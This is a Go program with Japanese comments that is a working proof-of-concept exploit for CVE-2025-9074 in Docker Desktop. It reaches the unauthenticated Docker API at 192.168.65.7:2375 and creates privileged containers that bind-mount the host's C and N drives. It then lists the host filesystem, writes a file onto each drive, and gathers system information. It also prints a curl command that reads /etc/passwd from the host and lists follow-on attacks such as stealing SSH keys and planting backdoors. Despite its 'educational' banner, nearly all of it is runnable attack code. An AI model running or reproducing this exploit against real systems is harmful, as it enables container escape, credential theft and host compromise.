package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

// ContainerConfig は、Dockerコンテナを作成するための設定を定義します
type ContainerConfig struct {
	Image      string     `json:"Image"`
	Cmd        []string   `json:"Cmd"`
	HostConfig HostConfig `json:"HostConfig"`
	Env        []string   `json:"Env"`
}

// HostConfig は、ホストシステムとの連携設定を定義します
type HostConfig struct {
	Privileged bool     `json:"Privileged"`
	Binds      []string `json:"Binds,omitempty"`
	Mounts     []Mount  `json:"Mounts,omitempty"`
}

// Mount は HostConfig.Mounts 用の設定です
type Mount struct {
	Type     string `json:"Type"`
	Source   string `json:"Source"`
	Target   string `json:"Target"`
	ReadOnly bool   `json:"ReadOnly,omitempty"`
}

// ContainerCreateResponse は、コンテナ作成APIのレスポンス形式です
type ContainerCreateResponse struct {
	ID       string   `json:"Id"`
	Warnings []string `json:"Warnings"`
}

// ImageListResponse は、イメージ一覧APIのレスポンス形式です
type ImageInfo struct {
	ID       string   `json:"Id"`
	RepoTags []string `json:"RepoTags"`
}

const (
	// 脆弱性のあるDocker APIのエンドポイント
	dockerAPIEndpoint = "http://192.168.65.7:2375"
	requestTimeout    = 30 * time.Second
)

func main() {
	fmt.Println("========================================")
	fmt.Println("CVE-2025-9074 脆弱性の教育的実証")
	fmt.Println("警告: このコードは教育目的のみです")
	fmt.Println("Docker Desktop 4.44.3以降では修正済みです")
	fmt.Println("========================================")

	// ステップ1: Docker APIの到達可能性を確認
	fmt.Println("[1] Docker APIエンドポイントの確認中...")
	if !checkDockerAPI() {
		fmt.Println("✗ Docker APIに接続できません（修正済みまたは異なる環境）")
		fmt.Println("\nシステムが保護されています。")
		os.Exit(0)
	}
	fmt.Println("✓ Docker APIに接続成功")
	fmt.Println("⚠️  警告: システムが脆弱です！")

	// ステップ2: 利用可能なイメージを確認
	fmt.Println("[2] 利用可能なDockerイメージの確認中...")
	availableImage := findOrPullImage()
	if availableImage == "" {
		fmt.Println("✗ 利用可能なイメージがありません")
		os.Exit(1)
	}
	fmt.Printf("✓ 使用するイメージ: %s\n\n", availableImage)

	// ステップ3: 脆弱性の実証を実行
	fmt.Println("[3] 脆弱性の実証を実行します...")
	demonstrateVulnerability(availableImage)
}

// checkDockerAPI は、Docker APIが到達可能かどうかを確認します
func checkDockerAPI() bool {
	client := &http.Client{Timeout: requestTimeout}

	resp, err := client.Get(dockerAPIEndpoint + "/version")
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		// APIバージョン情報を読み取って表示
		body, _ := io.ReadAll(resp.Body)
		var versionInfo map[string]interface{}
		if json.Unmarshal(body, &versionInfo) == nil {
			if version, ok := versionInfo["Version"].(string); ok {
				fmt.Printf("   検出されたDocker Engine: %s\n", version)
			}
		}
		return true
	}

	return false
}

// findOrPullImage は、利用可能なイメージを探すか、必要に応じてプルします
func findOrPullImage() string {
	// まず、既存のイメージをチェック
	existingImages := listImages()

	// 一般的な軽量イメージを優先順位付きでチェック
	preferredImages := []string{
		"alpine", "busybox", "ubuntu", "debian", "centos", "nginx", "httpd",
	}

	for _, preferred := range preferredImages {
		for _, existing := range existingImages {
			if strings.Contains(existing, preferred) {
				fmt.Printf("   既存のイメージを発見: %s\n", existing)
				return existing
			}
		}
	}

	// 既存のイメージがない場合、alpineをプルを試みる
	fmt.Println("   既存のイメージが見つかりません。alpineのプルを試みます...")
	if pullImage("alpine:latest") {
		return "alpine:latest"
	}

	// それでもダメなら、最初に見つかったイメージを使用
	if len(existingImages) > 0 {
		return existingImages[0]
	}

	return ""
}

// listImages は、利用可能なDockerイメージの一覧を取得します
func listImages() []string {
	client := &http.Client{Timeout: requestTimeout}

	resp, err := client.Get(dockerAPIEndpoint + "/images/json")
	if err != nil {
		return []string{}
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return []string{}
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return []string{}
	}

	var images []ImageInfo
	if err := json.Unmarshal(body, &images); err != nil {
		return []string{}
	}

	var imageNames []string
	for _, img := range images {
		if len(img.RepoTags) > 0 && img.RepoTags[0] != "<none>:<none>" {
			imageNames = append(imageNames, img.RepoTags[0])
		}
	}

	return imageNames
}

// pullImage は、指定されたイメージをプルします
func pullImage(imageName string) bool {
	fmt.Printf("   イメージをプル中: %s\n", imageName)

	client := &http.Client{Timeout: 60 * time.Second}

	// イメージ名をエンコード
	imageParts := strings.Split(imageName, ":")
	image := imageParts[0]
	tag := "latest"
	if len(imageParts) > 1 {
		tag = imageParts[1]
	}

	url := fmt.Sprintf("%s/images/create?fromImage=%s&tag=%s", dockerAPIEndpoint, image, tag)

	req, err := http.NewRequest("POST", url, nil)
	if err != nil {
		fmt.Printf("   ✗ プルリクエスト作成失敗: %v\n", err)
		return false
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("   ✗ イメージプル失敗: %v\n", err)
		return false
	}
	defer resp.Body.Close()

	// プル進行状況を読み取る（簡略化）
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode == http.StatusOK {
		fmt.Printf("   ✓ イメージプル成功: %s\n", imageName)
		return true
	}

	fmt.Printf("   ✗ イメージプル失敗 (status %d): %s\n", resp.StatusCode, body)
	return false
}

// demonstrateVulnerability は、脆弱性を安全に実証します
func demonstrateVulnerability(imageName string) {
	fmt.Println("\n========================================")
	fmt.Println("脆弱性の実証")
	fmt.Println("========================================")

	// ホストに作成するファイル名（C:\ 直下）
	hostFileName := "cve_2025_9074_poc.txt"
	containerTargetPath := "/host_root/" + hostFileName

	// 表示用（代表例）の設定を表示（Mounts: /run/desktop/mnt/host/c）
	demoConfig := ContainerConfig{
		Image: imageName,
		Cmd: []string{
			"sh", "-c",
			"echo '=== ホストファイルシステムアクセスの実証 ===' && " +
				"ls -la /host_root && " +
				"echo '=== システム情報の取得 ===' && " +
				"uname -a && " +
				"echo '=== 攻撃成功の証明ファイル作成 ===' && " +
				"echo 'CVE-2025-9074 POC - $(date)' > " + containerTargetPath,
		},
		HostConfig: HostConfig{
			Privileged: true,
			Mounts: []Mount{
				{Type: "bind", Source: "/run/desktop/mnt/host/c", Target: "/host_root"},
			},
		},
		Env: []string{
			"ATTACK_TYPE=CVE-2025-9074",
			"MODE=EDUCATIONAL_DEMO",
		},
	}

	jsonData, _ := json.MarshalIndent(demoConfig, "", "  ")
	fmt.Println("以下のJSON設定をPOST /containers/createに送信することで、")
	fmt.Println("ホストシステムへの完全なアクセスが可能になります：")
	fmt.Println("\n" + string(jsonData))

	// 実際に作成・起動してホストへファイルを書き込む（Cドライブ）
	hostCandidatesC := []string{
		"/run/desktop/mnt/host/c",
		"/host_mnt/c",
		"C:/",
		"C:\\",
	}
	attemptHostWrite(imageName, hostCandidatesC, "C", hostFileName)

	// 続けて Nドライブにも作成
	hostCandidatesN := []string{
		"/run/desktop/mnt/host/n",
		"/host_mnt/n",
		"N:/",
		"N:\\",
	}
	attemptHostWrite(imageName, hostCandidatesN, "N", hostFileName)

	fmt.Println("========================================")
	fmt.Println("実際に実行可能な攻撃：")
	fmt.Println("========================================")
	fmt.Println("1. ホストファイルシステムの完全な読み書きアクセス")
	fmt.Println("2. 機密ファイル（パスワード、SSHキー等）の窃取")
	fmt.Println("3. システム設定ファイルの改ざん")
	fmt.Println("4. マルウェアやバックドアの設置")
	fmt.Println("5. 他のコンテナへの侵入")
	fmt.Println("6. ネットワーク設定の変更")
	fmt.Println("7. 特権昇格攻撃の実行")

	fmt.Println("\n========================================")
	fmt.Println("簡単な攻撃実行例（curlコマンド）：")
	fmt.Println("========================================")

	// curlを使った攻撃例を表示
	fmt.Println("# ステップ1: コンテナ作成")
	fmt.Printf("curl -X POST %s/containers/create \\\n", dockerAPIEndpoint)
	fmt.Println("  -H 'Content-Type: application/json' \\")
	fmt.Println("  -d '{")
	fmt.Printf("    \"Image\": \"%s\",\n", imageName)
	fmt.Println("    \"Cmd\": [\"sh\", \"-c\", \"cat /host_root/etc/passwd\"],")
	fmt.Println("    \"HostConfig\": {")
	fmt.Println("      \"Privileged\": true,")
	fmt.Println("      \"Binds\": [\"C:/:/host_root\"]")
	fmt.Println("    }")
	fmt.Println("  }'")
	fmt.Println("\n# ステップ2: コンテナ起動")
	fmt.Println("curl -X POST " + dockerAPIEndpoint + "/containers/{container_id}/start")

	// システム情報の収集（教育目的）
	fmt.Println("\n========================================")
	fmt.Println("現在のシステム状態：")
	fmt.Println("========================================")
	showSystemInfo()
}

// createContainer は Docker Remote API を用いてコンテナを作成します
func createContainer(config ContainerConfig) (string, error) {
	client := &http.Client{Timeout: requestTimeout}
	body, err := json.Marshal(config)
	if err != nil {
		return "", err
	}
	req, err := http.NewRequest("POST", dockerAPIEndpoint+"/containers/create", bytes.NewReader(body))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("container create failed: status %d: %s", resp.StatusCode, string(respBody))
	}

	var createResp ContainerCreateResponse
	if err := json.Unmarshal(respBody, &createResp); err != nil {
		return "", err
	}
	return createResp.ID, nil
}

// startContainer は作成済みコンテナを起動します
func startContainer(containerID string) error {
	client := &http.Client{Timeout: requestTimeout}
	req, err := http.NewRequest("POST", fmt.Sprintf("%s/containers/%s/start", dockerAPIEndpoint, containerID), nil)
	if err != nil {
		return err
	}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusNoContent {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("start failed: status %d: %s", resp.StatusCode, string(body))
	}
	return nil
}

type containerWaitResponse struct {
	StatusCode int `json:"StatusCode"`
}

// waitContainer はコンテナの終了まで待機し、終了コードを返します
func waitContainer(containerID string) (int, error) {
	client := &http.Client{Timeout: 120 * time.Second}
	req, err := http.NewRequest("POST", fmt.Sprintf("%s/containers/%s/wait", dockerAPIEndpoint, containerID), nil)
	if err != nil {
		return -1, err
	}
	resp, err := client.Do(req)
	if err != nil {
		return -1, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return -1, fmt.Errorf("wait failed: status %d: %s", resp.StatusCode, string(body))
	}
	var wr containerWaitResponse
	data, _ := io.ReadAll(resp.Body)
	if err := json.Unmarshal(data, &wr); err != nil {
		return -1, err
	}
	return wr.StatusCode, nil
}

// deleteContainer はコンテナを削除します（force=true 推奨）
func deleteContainer(containerID string, force bool) error {
	client := &http.Client{Timeout: requestTimeout}
	url := fmt.Sprintf("%s/containers/%s", dockerAPIEndpoint, containerID)
	if force {
		url += "?force=true"
	}
	req, err := http.NewRequest("DELETE", url, nil)
	if err != nil {
		return err
	}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	// 204(No Content) が一般的
	if resp.StatusCode != http.StatusNoContent && resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("delete failed: status %d: %s", resp.StatusCode, string(body))
	}
	return nil
}

// attemptHostWrite は、与えられた候補 Source を順に試し、ホストの指定ドライブ直下にファイルを作成する
// 実行後はコンテナを自動削除する
func attemptHostWrite(imageName string, hostCandidates []string, driveLabel string, hostFileName string) {
	fmt.Printf("[実行] %sドライブにファイルを作成します...\n", driveLabel)

	containerTargetPath := "/host_root/" + hostFileName

	baseConfig := ContainerConfig{
		Image: imageName,
		Cmd: []string{
			"sh", "-c",
			"echo '=== ホストファイルシステムアクセスの実証 ===' && " +
				"ls -la /host_root && " +
				"echo '=== システム情報の取得 ===' && " +
				"uname -a && " +
				"echo '=== 攻撃成功の証明ファイル作成 ===' && " +
				"echo 'CVE-2025-9074 POC - $(date)' > " + containerTargetPath,
		},
		HostConfig: HostConfig{Privileged: true},
		Env: []string{
			"ATTACK_TYPE=CVE-2025-9074",
			"MODE=EDUCATIONAL_DEMO",
		},
	}

	var (
		containerID string
		usedSource  string
	)

	for _, src := range hostCandidates {
		fmt.Printf("   試行: Source=%s を /host_root にbind\n", src)
		cfg := baseConfig
		cfg.HostConfig.Mounts = []Mount{{Type: "bind", Source: src, Target: "/host_root"}}
		id, err := createContainer(cfg)
		if err != nil {
			fmt.Printf("     ↪ 失敗: %v\n", err)
			continue
		}
		containerID = id
		usedSource = src
		break
	}

	if containerID == "" {
		fmt.Printf("   ✗ %sドライブの候補パスいずれも作成に失敗しました。公開設定をご確認ください。\n", driveLabel)
		return
	}
	fmt.Printf("   ✓ コンテナ作成成功: %s (Source=%s)\n", containerID, usedSource)

	// 起動
	if err := startContainer(containerID); err != nil {
		fmt.Printf("   ✗ コンテナ起動失敗: %v\n", err)
		// 自動削除
		if err := deleteContainer(containerID, true); err != nil {
			fmt.Printf("   ✗ コンテナ削除失敗: %v\n", err)
		} else {
			fmt.Println("   ✓ コンテナを削除しました")
		}
		return
	}
	fmt.Println("   ✓ コンテナ起動済み。コマンド完了を待機します...")

	if status, err := waitContainer(containerID); err != nil {
		fmt.Printf("   ✗ wait失敗: %v\n", err)
	} else {
		fmt.Printf("   ✓ コマンド完了 (終了コード=%d)\n", status)
	}

	fmt.Println("\n[結果] 以下のファイルがホストに作成されました（想定）:")
	fmt.Printf("   %s:%s%s\n", driveLabel, "\\", hostFileName)
	fmt.Println("   コンテナ内パス:", containerTargetPath)
	fmt.Printf("   使用したSource: %s\n", usedSource)

	// 自動削除
	if err := deleteContainer(containerID, true); err != nil {
		fmt.Printf("\n   ✗ コンテナ削除失敗: %v\n", err)
	} else {
		fmt.Println("\n   ✓ コンテナを削除しました")
	}
}

// showSystemInfo は、現在のシステム情報を表示します
func showSystemInfo() {
	client := &http.Client{Timeout: requestTimeout}

	// Dockerの情報を取得
	resp, err := client.Get(dockerAPIEndpoint + "/info")
	if err != nil {
		fmt.Println("システム情報の取得に失敗しました")
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		var info map[string]interface{}
		if json.Unmarshal(body, &info) == nil {
			// 重要な情報のみを抽出して表示
			if containers, ok := info["Containers"].(float64); ok {
				fmt.Printf("実行中のコンテナ数: %.0f\n", containers)
			}
			if images, ok := info["Images"].(float64); ok {
				fmt.Printf("利用可能なイメージ数: %.0f\n", images)
			}
			if serverVersion, ok := info["ServerVersion"].(string); ok {
				fmt.Printf("Docker Engineバージョン: %s\n", serverVersion)
			}
			if osType, ok := info["OSType"].(string); ok {
				fmt.Printf("OSタイプ: %s\n", osType)
			}

			// セキュリティ設定の確認
			fmt.Println("\nセキュリティ関連の設定:")
			if isolation, ok := info["Isolation"].(string); ok {
				fmt.Printf("分離モード: %s\n", isolation)
			}
			if securityOptions, ok := info["SecurityOptions"].([]interface{}); ok {
				fmt.Printf("セキュリティオプション: %v\n", securityOptions)
			}
		}
	}

	fmt.Println("\n注意: この情報は、認証なしでアクセス可能でした。")
	fmt.Println("これ自体が重大なセキュリティリスクです。")
}
